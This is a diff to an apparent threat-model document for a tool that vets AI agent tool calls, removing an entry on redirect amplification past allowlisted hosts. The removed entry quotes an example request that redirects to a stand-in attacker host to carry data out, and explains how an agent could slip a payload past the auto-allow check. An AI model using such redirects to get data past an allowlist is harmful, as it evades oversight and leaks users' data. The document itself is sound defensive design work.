@@ -187,45 +187,14 @@ fidelity loss the approver is prompted to scrutinise the call.
 
 ---
 
-## T10 — Redirect amplification past an allowlisted host
-
-`HttpRequest.follow_redirects` is tracked on the effect
-(`vetter-core/src/parsers/types.rs`) but never produces a
-`RiskSignal`, and the allowlist `http:` predicate exposes no
-`no_redirects:` opt-in. An allowlisted call such as
-
-```
-GET https://api.example.com/r?to=https://evil.attacker.example/log?…
-```
-
-auto-allows because the URL matches the rule's `host:
-api.example.com` clause, but curl's `-L` (or curl's default when a
-future parser treats redirects as implicit) will chase the
-redirect — and allow an allowlisted-but-compromised host to turn
-into an egress channel for any payload the agent can sneak into
-the request. The same shape covers HSTS-less `http://` redirects
-and open-redirect endpoints that are common on even reputable APIs
-(`/out?url=…`, SSO flows).
-
-Close options: (a) emit a `FollowRedirects` signal any time
-`follow_redirects == true`, forcing the call onto the prompt path
-unless an explicit rule opts in; (b) extend the `http:` predicate
-with `no_redirects: true` (default) / `allow_redirect_to: [hosts]`
-so rules can explicitly accept the expanded trust surface; (c)
-refuse auto-allow outright for any `HttpRequest` with
-`follow_redirects && method != GET` (the common case where
-redirect chains are load-bearing is GET-only).
-
----
-
 ## Sequencing
 
 T5 (homograph detection) is partial-mitigation only and tracks the
-open detection work. T6–T10 are unshipped threats discovered in
+open detection work. T6–T9 are unshipped threats discovered in
 review; sequencing lives in TODO.md's Hardening sections (H1 covers
-T6/T8's filesystem checks, H2 covers T9's stdin digest + T10's
-redirect signal, H5 adds the workspace-trust gate for T7).
-Everything below this line is the closed list.
+T6/T8's filesystem checks, H2 covers T9's stdin digest, H5 adds the
+workspace-trust gate for T7). Everything below this line is the
+closed list.
 
 Already shipped:
 
